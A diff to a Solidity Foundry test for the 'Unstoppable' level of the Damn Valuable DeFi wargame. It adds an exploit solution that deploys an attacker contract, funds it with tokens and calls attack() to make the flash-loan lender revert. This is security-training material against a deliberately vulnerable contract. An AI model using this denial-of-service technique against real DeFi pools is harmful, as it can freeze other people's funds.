@@ -7,6 +7,7 @@ import "forge-std/Test.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {UnstoppableLender} from "../../../src/Contracts/unstoppable/UnstoppableLender.sol";
 import {ReceiverUnstoppable} from "../../../src/Contracts/unstoppable/ReceiverUnstoppable.sol";
+import {UnstoppableAttacker} from "../../../src/Solutions/unstoppable/UnstoppableAttacker.sol";
 
 contract Unstoppable is Test {
     uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;
@@ -63,6 +64,19 @@ contract Unstoppable is Test {
         /**
          * EXPLOIT END *
          */
+        vm.startPrank(attacker);
+        UnstoppableAttacker unstoppableAttacker = new UnstoppableAttacker(address(unstoppableLender));
+        dvt.transfer(address(unstoppableAttacker), 10000);
+
+//        console.log("TOKENS_IN_POOL is:", TOKENS_IN_POOL);
+//        console.log("pool balance is:", unstoppableLender.poolBalance());
+//        console.log("address balance is:", dvt.balanceOf(attacker));
+//        console.log("attacker balance is:", dvt.balanceOf(address(unstoppableAttacker)));
+
+        unstoppableAttacker.attack();
+
+        vm.stopPrank();
+
         vm.expectRevert(UnstoppableLender.AssertionViolated.selector);
         validation();
         console.log(unicode"\n🎉 Congratulations, you can go to the next level! 🎉");
